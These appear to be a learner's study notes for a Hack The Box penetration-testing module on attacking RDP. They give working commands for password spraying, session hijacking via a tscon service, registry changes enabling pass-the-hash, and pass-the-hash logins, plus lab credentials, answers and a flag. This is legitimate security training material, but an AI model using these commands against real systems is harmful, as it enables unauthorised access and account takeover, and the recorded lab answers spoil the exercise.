### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - RDP Attacks & Vulnerabilities <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking RDP



RDP defaults to `TCP/3389`. Detect:

```diff
+ $ nmap -Pn -p3389 192.168.2.143
```

<br>

Password spraying with `Crowbar`:

```diff
+ $ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

<br>

Hydra spray:

```diff
+ $ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

Hydra warns RDP doesn't like many parallel connections - drops to 4 tasks.

<br>

Connect with `rdesktop` or `xfreerdp`:

```diff
+ $ rdesktop -u admin -p password123 192.168.2.143
```

<br>

---

<br>

### RDP Session Hijacking



If we have local admin + `SYSTEM` privs on a host where another user is connected via RDP, [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) attaches one session to another without their password.

Identify sessions:

```diff
+ C:\> query user
```

	USERNAME      SESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME
	juurena       rdp-tcp#13     1  Active          7  ...
	lewen         rdp-tcp#14     2  Active          *  ...

<br>

Create a service to launch `tscon` as `LocalSystem`:

```diff
+ C:\> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+ C:\> net start sessionhijack
```

Note: this method no longer works on Server 2019.

<br>

---

<br>

### RDP Pass-the-Hash (PtH)



PtH over RDP requires `Restricted Admin Mode` on the target. Enable via the `DisableRestrictedAdmin` registry key:

```diff
+ C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

<br>

Connect via `xfreerdp /pth`:

```diff
+ $ xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

<br>

---

<br>

### Latest RDP Vulnerabilities - BlueKeep CVE-2019-0708



`BlueKeep` ([CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)) - pre-auth Use-After-Free in RDP `TCP/3389`. Exploitation runs commands with `LocalSystem` privileges.

Caution: BlueKeep exploits cause system instability / BSoD - get explicit client approval before firing.

#### Concept mapping - initiation:

| # | Step | Category |
|---|---|---|
| 1 | Manipulated initialization request as the source. | `Source` |
| 2 | Vulnerable function during virtual channel creation. | `Process` |
| 3 | RDP runs as `LocalSystem`. | `Privileges` |
| 4 | Kernel process is the destination. | `Destination` |

#### Concept mapping - RCE (cycle restart):

| # | Step | Category |
|---|---|---|
| 5 | Attacker payload as the new source. | `Source` |
| 6 | Kernel frees memory; CPU executes attacker code. | `Process` |
| 7 | Code runs with `LocalSystem` privs. | `Privileges` |
| 8 | Reverse shell back over network. | `Destination` |

<br>

---

<br>

### RDP Exercise

IP: 10.129.203.13 - RDP creds: `htb-rdp:HTBRocks!`

---

### Question 1:
What is the name of the file that was left on the Desktop? (Format example: filename.txt)

#### Connect with `xfreerdp` and mount a local share for file extraction.

```diff
+ $ xfreerdp /v:10.129.203.13 /u:htb-rdp /p:'HTBRocks!' /drive:linux,/home/htb-ac-830862/rdpee/
```

&#x1F6A9; found **pentest-notes.txt**.

---

### Question 2:
Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?

&#x1F6A9; found **DisableRestrictedAdmin**.

---

### Question 3:
Connect via RDP with the Administrator account and submit the flag.txt as your answer.

#### Initial PtH attempt blocked by `DisableRestrictedAdmin` - log in as `htb-rdp` first and add the registry key:

```diff
+ C:\Users\htb-rdp> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Reauth via PtH as Administrator:

```diff
+ $ xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
```

&#x1F6A9; found **HTB{RDP_P--edit--4$$_Th3_H4$#}**.
